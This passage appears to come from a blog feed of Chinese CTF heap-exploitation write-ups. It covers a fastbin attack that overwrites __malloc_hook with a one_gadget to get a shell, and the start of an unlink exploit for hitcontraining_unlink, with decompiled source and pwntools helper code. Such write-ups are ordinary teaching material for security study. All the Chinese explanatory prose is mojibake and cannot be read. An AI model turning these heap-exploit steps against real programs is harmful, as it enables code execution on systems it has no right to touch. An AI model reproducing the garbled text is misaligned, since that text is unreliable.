è¿›å…¥ fastbin</p><p>æ‰§è¡Œåçš„ç»“æœ</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a1.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a1-300x45.png"></a></p><p>é¡ºåˆ©çš„ä¼ªé€ äº†chunkï¼Œç„¶åå› ä¸º<strong>chunk1æ²¡æœ‰è¢«freeæ‰</strong>ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ <strong>malloc chunk0ï¼ŒæŠŠ fd å†™å…¥chunk1</strong>(fake top chunk)ï¼Œç„¶åé€šè¿‡showï¼Œæš´éœ²å‡ºæ¥</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a2.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a2.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;p&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">3</span>)+<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;t&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;heapinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add = u64(c)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(add)</span><br><span class="line">base = add-<span class="number">0x3c4b78</span><span class="comment">#static addr</span></span><br><span class="line">libc.address = base</span><br><span class="line">print(<span class="string">&quot;libc ==&gt; %s&quot;</span> %base)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­0x3c4b78æ˜¯64ä½ä¸‹å›ºå®šçš„åç§»é‡(æ®è¯´)</p><p>å¾—åˆ°libcçš„åŸºå€ï¼Œæ‰¾åˆ° <strong>one_gadget , malloc_hook , realloc_hook , realloc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;malloc_hook ==&gt; %s&quot;</span> %<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">print(<span class="string">&#x27;realloc ==&gt; %s&#x27;</span> %<span class="built_in">hex</span>(realloc))</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œé€šè¿‡ å› ä¸º chunk3 åœ¨fastbinä¸­ï¼ŒåŒæ—¶ä¹Ÿåœ¨unsorted binä¸­ï¼Œå› æ­¤ï¼Œå…ˆé€šè¿‡malloc ä¸€ä¸ªå¤§å †å—ï¼Œä¼ªé€ chunk3çš„fdæŒ‡é’ˆ</p><p><code>add(0xf8,&#39;0&#39;*0x80+p64(0)+p64(0x71)+p64(malloc_hook-0x23))#fake fd</code></p><p>ä¼ªé€ åçš„ç»“æœ</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a3.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a3-300x138.png"></a></p><p>å¯ä»¥çœ‹åˆ°é¡ºåˆ©çš„ä¿®æ”¹äº† fd æŒ‡é’ˆï¼Œè¿æ¥åˆ°äº†malloc_hook-0x23ä¸­</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a4.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a4-300x76.png"></a></p><p>ä¹‹åå°±æ˜¯æ¨¡æ¿äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>)<span class="comment">#malloc fastbin</span></span><br><span class="line">gadgets = <span class="number">0x4526a</span> + libc.address<span class="comment">#one_gadgets</span></span><br><span class="line">print(<span class="string">&quot;gadgets ==&gt; %s&quot;</span> %<span class="built_in">hex</span>(gadgets))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span> + p64(gadgets)+p64(realloc+<span class="number">13</span>))</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„malloc_hook å¦‚ä¸‹</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a5.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a5-300x39.png"></a></p><p>æ­¤æ—¶åœ¨æ‰§è¡Œä¸€æ¬¡mallocæ“ä½œï¼Œå°±ä¼šæŒ‰é¡ºåºæ‰§è¡Œ</p><p> <code>malloc =&gt; malloc_hook =&gt; realloc+13 =&gt; realloc_hook =&gt; gadget</code> </p><p>äºæ˜¯æ‹¿åˆ°shell</p><p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a6.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a6-300x90.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/unlink.html"/>
      <url>/unlink.html</url>
      
        <content type="html"><![CDATA[<p>Linux ä¸‹å †æº¢å‡ºunlinkå®ä¾‹ã€‚</p><a id="more"></a><h2 id="unlink-ç®€ä»‹"><a href="#unlink-ç®€ä»‹" class="headerlink" title="unlink ç®€ä»‹"></a>unlink ç®€ä»‹</h2><p>æˆ‘çŸ¥é“è‡ªå·±ä»‹ç»è‚¯å®šå¾ˆèœ,æ‰€ä»¥å¹²è„†ç”¨ CTF WIKI çš„æ¥å§<br><a href="https://wiki.x10sec.org/pwn/heap/unlink/">CTFWIKI unlink</a></p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>åšç¤ºä¾‹çš„æ˜¯ <code>hitcontraining_unlink</code></p><h3 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v3 = hello_message;</span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, _QWORD))*v3)(<span class="number">16L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v2 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[<span class="number">4</span> * i] = v2;</span><br><span class="line">        *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">        *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, *(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>], v2)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_401089);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">remove_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v1 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>]);</span><br><span class="line">      *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">      itemlist[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST08_4</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *(_QWORD *)&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 &#x3D; atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v2 + 2] + (signed int)read(0, *(void **)&amp;itemlist[4 * v2 + 2], v0)) &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>åœ¨ <code>change_item</code> ä¸­æ²¡æœ‰åˆ¤æ–­è¾“å…¥å­—ç¬¦çš„ä¸ªæ•°,å¯¼è‡´å †æº¢å‡º,ç”±äºæ²¡æœ‰å¼€å¯ <code>PIE</code> æ‰€ä»¥ <code>unlink</code> å¾ˆæ–¹ä¾¿</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>é¦–å…ˆå®Œå–„ä¸€ä¸‹å„ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h4 id="ä¼ªé€ å †å—"><a href="#ä¼ªé€ å †å—" class="headerlink" title="ä¼ªé€ å †å—"></a>ä¼ªé€ å †å—</h4><p>å…ˆ <code>add</code> ä¸‰ä¸ªå †å—, ç„¶ååˆ©ç”¨ <code>edit</code> çš„å †æº¢å‡º,ä¿®æ”¹ å †å—1 ,åœ¨ å †å—1 ä¸­ä¼ªé€ ä¸€ä¸ªå‡çš„ chunk,å‡çš„ chunk çš„ç»“æ„å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-------------------------</span><br><span class="line">|  presize  |    size   |</span><br><span class="line">|           |    0x20   |</span><br><span class="line">-------------------------</span><br><span class="line">|  fake_fd  |  fake_bk  |</span><br><span class="line">|0x6020D8-0x18| 0x6020D8-0x10|</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |</span><br><span class="line">|    0x20   |   0x20    |</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |   &lt;----- next chunk</span><br><span class="line">|    0x30   |    0x90   |</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹äº† <code>next chunk</code> çš„ <code>inuse</code> ä½ä¸º0,è¿™æ ·å°±å‡è£…å·²ç»è¢« <code>free</code> äº†<br>ä¸ºä»€ä¹ˆæ˜¯ <code>0x6020D8</code> <code>-0x18</code> å’Œ <code>-0x10</code> å‘¢<br>å› ä¸ºåœ¨å†…å­˜ä¸­,<strong>å­˜æ”¾ å †å—1 çš„åœ°å€æ˜¯ <code>0x6020D8</code></strong><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921286897.png" alt="file"></p><h4 id="unlink"><a href="#unlink" 